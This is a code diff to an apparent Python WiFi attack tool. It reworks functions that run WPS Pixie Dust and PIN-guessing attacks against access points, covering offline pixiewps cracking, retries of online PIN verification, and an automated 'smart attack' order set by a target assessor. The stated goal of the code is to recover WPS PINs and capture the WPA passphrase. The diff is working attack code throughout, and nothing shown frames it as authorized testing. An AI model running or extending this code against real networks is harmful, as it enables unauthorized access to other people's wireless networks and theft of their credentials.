@@ -150,6 +150,8 @@ def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
 
         elif attack_type == "pixie":
             cb("[*] Collecting Pixie Dust data...")
+            # Engine already runs pixiewps + online verify internally.
+            # Do NOT run a second pixiewps pass here (it wiped data before).
             result = engine.collect_pixie_data(
                 bssid,
                 max_attempts=8,
@@ -157,9 +159,9 @@ def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
             )
             attempt_records.extend(result.get("attempts", []))
             final_status = _result_status(result)
-            final_attempted_pin = result.get("attempted_pin")
+            final_attempted_pin = result.get("attempted_pin") or result.get("pixie_pin")
 
-            pixie = result.get("pixie_data", {})
+            pixie = result.get("pixie_data", {}) or {}
             collected = sum(
                 1 for key in [
                     "PKE", "PKR", "E_NONCE", "R_NONCE",
@@ -167,78 +169,73 @@ def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
                 ]
                 if pixie.get(key)
             )
-
-            if collected >= 4 and pixie.get("PKE"):
-                cb("[*] Running pixiewps with {count}/7 data fields...".format(
-                    count=collected
-                ))
-                import shutil
-                if shutil.which("pixiewps"):
-                    import subprocess
-                    cmd = [
-                        "pixiewps",
-                        "--pke", pixie.get("PKE", ""),
-                        "--pkr", pixie.get("PKR", ""),
-                        "--e-hash1", pixie.get("E_HASH1", ""),
-                        "--e-hash2", pixie.get("E_HASH2", ""),
-                        "--authkey", pixie.get("AUTHKEY", ""),
-                        "--e-nonce", pixie.get("E_NONCE", ""),
-                        "--r-nonce", pixie.get("R_NONCE", ""),
-                        "--e-bssid", bssid.replace(":", ""),
-                        "--mode", "1,2,3,4,5",
-                    ]
-                    cmd = [value for value in cmd if value and not value.isspace()]
-                    try:
-                        run_result = subprocess.run(
-                            cmd,
-                            capture_output=True,
-                            text=True,
-                            timeout=120,
-                        )
-                        output_lines.append(run_result.stdout)
-                        for line in run_result.stdout.split("\n"):
-                            if "WPS pin" in line and "[+]" in line:
-                                extracted_pin = line.split(":")[-1].strip()
-                                if extracted_pin and extracted_pin != "<empty>":
-                                    cb("[*] PIXIEWPS candidate PIN: " + extracted_pin)
-                                    cb("[*] Verifying candidate PIN...")
-                                    verify_started = time.time()
-                                    verify_result = engine.wps_pin_attack(
-                                        bssid,
-                                        extracted_pin,
-                                        timeout=45,
-                                    )
-                                    verify_elapsed = time.time() - verify_started
-                                    attempt_records.append({
-                                        "pin": extracted_pin,
-                                        "status": verify_result.get("status", "unknown"),
-                                        "response": verify_result.get("output", "")[-500:],
-                                        "duration": verify_elapsed,
-                                    })
-                                    final_status = _result_status(verify_result, final_status)
-                                    final_attempted_pin = (
-                                        verify_result.get("attempted_pin") or
-                                        extracted_pin
-                                    )
-                                    if _is_real_success(verify_result):
-                                        found_pin = verify_result.get("pin")
-                                        found_psk = verify_result.get("psk")
-                                        cb("[+] PIN VERIFIED!")
-                                        break
-                    except Exception as exc:
-                        cb("[!] pixiewps error: " + str(exc))
-                else:
-                    cb("[!] pixiewps not installed")
-            else:
-                cb("[!] Not enough data for pixiewps ({count}/7)".format(
-                    count=collected
-                ))
+            cb("[*] Pixie fields retained: {count}/7".format(count=collected))
 
             if _is_real_success(result):
                 found_pin = result.get("pin")
                 found_psk = result.get("psk")
                 final_status = "success"
-                final_attempted_pin = result.get("attempted_pin")
+                final_attempted_pin = result.get("attempted_pin") or found_pin
+                cb("[+] PIXIE SUCCESS — PIN and PSK verified")
+            elif result.get("status") == "pixie_pin_unverified":
+                # Offline crack found a PIN but PSK not confirmed yet
+                found_pin = result.get("pixie_pin") or result.get("pin")
+                final_attempted_pin = found_pin
+                final_status = "pixie_pin_unverified"
+                cb("[ok]PIXIEWPS recovered PIN: {pin}[/]".format(pin=found_pin))
+                cb(
+                    "[warn]PSK not verified online yet "
+                    "(weak signal / timeout / lock). "
+                    "Retry a single PIN attack with this PIN when closer to AP."
+                )
+                # One more verify attempt with clear_pixie=False if still no PSK
+                if found_pin:
+                    cb("[*] Retrying online verify for PIN {pin}...".format(
+                        pin=found_pin
+                    ))
+                    # Restore engine pixie snapshot if present
+                    if pixie:
+                        engine.pixie_data = dict(pixie)
+                    verify_started = time.time()
+                    verify_result = engine.wps_pin_attack(
+                        bssid,
+                        found_pin,
+                        timeout=60,
+                        clear_pixie=False,
+                    )
+                    verify_elapsed = time.time() - verify_started
+                    attempt_records.append({
+                        "pin": found_pin,
+                        "status": verify_result.get("status", "unknown"),
+                        "response": verify_result.get("output", "")[-500:],
+                        "duration": verify_elapsed,
+                    })
+                    if _is_real_success(verify_result):
+                        found_pin = verify_result.get("pin") or found_pin
+                        found_psk = verify_result.get("psk")
+                        final_status = "success"
+                        final_attempted_pin = found_pin
+                        cb("[+] PIN VERIFIED on retry — PSK captured")
+                    else:
+                        cb(
+                            "[!] Verify status: {st}. "
+                            "Save PIN {pin} and retry from menu PIN attack.".format(
+                                st=verify_result.get("status"),
+                                pin=found_pin,
+                            )
+                        )
+            elif result.get("status") == "pixie_not_vulnerable":
+                final_status = "pixie_not_vulnerable"
+                cb(
+                    "[!] Pixie offline attack failed with full data — "
+                    "this AP is likely NOT vulnerable to classic pixiewps. "
+                    "Do not spam Pixie on this BSSID."
+                )
+            elif collected < 4:
+                cb("[!] Not enough data for pixiewps ({count}/7)".format(
+                    count=collected
+                ))
+                final_status = "data_incomplete"
 
         elif attack_type == "bruteforce":
             analysis = analyze_target(bssid)
@@ -335,7 +332,13 @@ def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
     finally:
         engine.stop()
 
-    if final_status != "success":
+    # Keep recovered PIN even when PSK not yet verified (pixie offline hit)
+    if final_status == "success":
+        pass
+    elif final_status == "pixie_pin_unverified":
+        found_psk = None
+        # found_pin already set above
+    else:
         found_pin = None
         found_psk = None
 
@@ -363,12 +366,14 @@ def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
 
 
 def run_smart_attack(interface, bssid, wps_version="",
-                     wps_locked="Unknown", callback=None, skip_pins=None):
+                     wps_locked="Unknown", callback=None, skip_pins=None,
+                     essid="", network=None):
     """
-    Smart attack sequence using direct WpsEngine:
-    1. Try best algorithm PIN first
-    2. Try Pixie Dust collection / verification
-    3. Fall back to top 3 PINs
+    Smart attack sequence driven by TargetAssessor ranking when possible:
+      - high-confidence known PINs first
+      - Pixie only if tier is high/medium (skip last-resort automatically)
+      - limited calculated PIN tries
+    Falls back to legacy PIN→Pixie→top3 if assessor unavailable.
     """
     analysis = analyze_target(bssid, wps_version, wps_locked)
     combined_attempts = []
@@ -383,6 +388,20 @@ def run_smart_attack(interface, bssid, wps_version="",
         "attempts": [],
     }
 
+    # Prefer offline assessment plan
+    plan = None
+    try:
+        from modules.target_assessment import TargetAssessor
+        net = dict(network or {})
+        net.setdefault("bssid", bssid)
+        net.setdefault("essid", essid or "Unknown")
+        net.setdefault("wps_version", wps_version)
+        net.setdefault("wps_locked", wps_locked)
+        net.setdefault("has_wps", 1)
+        plan = TargetAssessor().assess(net)
+    except Exception:
+        plan = None
+
     if callback:
         callback("\n" + "=" * 50)
         callback("SMART ATTACK ANALYSIS")
@@ -392,74 +411,149 @@ def run_smart_attack(interface, bssid, wps_version="",
         callback("Algorithm:" + str(analysis["algorithm"]))
         callback("Best PIN: " + str(analysis["best_pin"]))
         callback("Confidence: " + str(analysis["confidence"]) + "%")
+        if plan:
+            callback("Pixie:    {tier} ({conf}%)".format(
+                tier=plan.get("pixie_tier"),
+                conf=plan.get("pixie_confidence"),
+            ))
+            callback("Order:    {order}".format(
+                order=" -> ".join(plan.get("attack_order") or [])[:90]
+            ))
+            callback("Recommend:" + str(plan.get("recommended_method") or ""))
         if tried_pins:
             callback("Resume:   skipping {count} previously tried PINs".format(
                 count=len(tried_pins)
             ))
         callback("=" * 50)
 
-    best_pin = analysis["best_pin"]
-    if best_pin in tried_pins:
+    def _try_pin(pin, label):
+        nonlocal last_result, combined_attempts, tried_pins
+        if not pin or pin in tried_pins:
+            if callback and pin in tried_pins:
+                callback("[*] Skipping already tried PIN: " + pin)
+            return False
         if callback:
-            callback("\n[*] Step 1: Skipping best PIN already tried: " + best_pin)
-    else:
-        if callback:
-            callback("\n[*] Step 1: Trying best PIN: " + best_pin)
-        last_result = run_wps_attack(interface, "pin", bssid, best_pin, callback)
+            callback("\n[*] {label}: {pin}".format(label=label, pin=pin))
+        last_result = run_wps_attack(interface, "pin", bssid, pin, callback)
         combined_attempts.extend(last_result.get("attempts", []))
         tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
         if last_result["status"] == "success":
             last_result["attempts"] = combined_attempts
-            return last_result
+            return True
         if last_result["status"] in ("locked", "m2d_rejected"):
             last_result["attempts"] = combined_attempts
-            return last_result
+            return True  # stop sequence
+        return False
 
-    if callback:
-        callback("\n[*] Step 2: Trying Pixie Dust...")
-    last_result = run_wps_attack(
-        interface,
-        "pixie",
-        bssid,
-        None,
-        callback,
-        skip_pins=tried_pins,
-    )
-    combined_attempts.extend(last_result.get("attempts", []))
-    tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
-    if last_result["status"] == "success":
+    def _try_pixie():
+        nonlocal last_result, combined_attempts, tried_pins
+        if callback:
+            callback("\n[*] Pixie Dust probe...")
+        last_result = run_wps_attack(
+            interface, "pixie", bssid, None, callback, skip_pins=tried_pins
+        )
+        combined_attempts.extend(last_result.get("attempts", []))
+        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
+        if last_result["status"] == "success":
+            last_result["attempts"] = combined_attempts
+            return True
+        if last_result["status"] in ("locked", "m2d_rejected", "pixie_not_vulnerable"):
+            last_result["attempts"] = combined_attempts
+            if last_result["status"] == "pixie_not_vulnerable" and callback:
+                callback("[*] Skipping further Pixie on this target (not vulnerable).")
+            return True
+        return False
+
+    # --- Planned path ---
+    if plan:
+        order = list(plan.get("attack_order") or [])
+        max_pins = int(plan.get("max_online_pins") or 3)
+        pins = list(plan.get("pin_candidates") or analysis.get("pins") or [])
+        # only use reasonably confident pins for auto sequence
+        pin_list = []
+        for item in pins:
+            pin = item.get("pin") if isinstance(item, dict) else None
+            conf = int(item.get("confidence") or 0) if isinstance(item, dict) else 0
+            if pin and conf >= 20 and pin not in pin_list:
+                pin_list.append(pin)
+            if len(pin_list) >= max_pins:
+                break
+
+        ran_pixie = False
+        for method in order:
+            if method in ("known_pin_sweep", "calculated_pin_sweep"):
+                for index, pin in enumerate(pin_list, 1):
+                    stop = _try_pin(
+                        pin,
+                        "PIN {index}/{total}".format(index=index, total=len(pin_list)),
+                    )
+                    if stop and last_result.get("status") in (
+                        "success", "locked", "m2d_rejected"
+                    ):
+                        return last_result
+            elif method == "pixie_probe" and not ran_pixie:
+                ran_pixie = True
+                if _try_pixie() and last_result.get("status") in (
+                    "success", "locked", "m2d_rejected"
+                ):
+                    return last_result
+                # if not vulnerable, don't continue to last-resort pixie
+                if last_result.get("status") == "pixie_not_vulnerable":
+                    break
+            elif method == "pixie_probe_last_resort":
+                # Auto smart-attack skips last-resort Pixie (manual only)
+                if callback:
+                    callback(
+                        "[*] Skipping last-resort Pixie in auto mode "
+                        "(conf too low / ISP profile)."
+                    )
+            elif method in (
+                "managed_pmkid_probe",
+                "passive_handshake_wait",
+                "external_adapter_if_active_capture_required",
+            ):
+                if callback:
+                    callback(
+                        "[*] Next offline/managed method suggested: {m} "
+                        "(use Handshake/PMKID menus — not auto-run here)".format(
+                            m=method
+                        )
+                    )
+
+        if callback:
+            callback("\n[*] Smart sequence finished (WPS online steps).")
         last_result["attempts"] = combined_attempts
         return last_result
-    if last_result["status"] in ("locked", "m2d_rejected"):
-        last_result["attempts"] = combined_attempts
+
+    # --- Legacy fallback ---
+    best_pin = analysis["best_pin"]
+    if _try_pin(best_pin, "Step 1 best PIN") and last_result.get("status") in (
+        "success", "locked", "m2d_rejected"
+    ):
         return last_result
+
+    if _try_pixie() and last_result.get("status") in (
+        "success", "locked", "m2d_rejected", "pixie_not_vulnerable"
+    ):
+        if last_result.get("status") != "pixie_not_vulnerable":
+            # continue only if not clearly immune? legacy continued after fail
+            pass
+        else:
+            last_result["attempts"] = combined_attempts
+            return last_result
 
     step_index = 0
     for pin_info in analysis["pins"][:3]:
         candidate_pin = pin_info["pin"]
         if candidate_pin == best_pin:
             continue
-        if candidate_pin in tried_pins:
-            if callback:
-                callback("\n[*] Step 3: Skipping already tried PIN: {pin}".format(
-                    pin=candidate_pin
-                ))
-            continue
         step_index += 1
-        if callback:
-            callback("\n[*] Step 3.{index}: Trying {pin} ({method})".format(
-                index=step_index,
-                pin=candidate_pin,
-                method=pin_info["method"],
-            ))
-        last_result = run_wps_attack(interface, "pin", bssid, candidate_pin, callback)
-        combined_attempts.extend(last_result.get("attempts", []))
-        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
-        if last_result["status"] == "success":
-            last_result["attempts"] = combined_attempts
-            return last_result
-        if last_result["status"] in ("locked", "m2d_rejected"):
-            last_result["attempts"] = combined_attempts
+        if _try_pin(
+            candidate_pin,
+            "Step 3.{index} {method}".format(
+                index=step_index, method=pin_info.get("method")
+            ),
+        ) and last_result.get("status") in ("success", "locked", "m2d_rejected"):
             return last_result
 
     if callback:
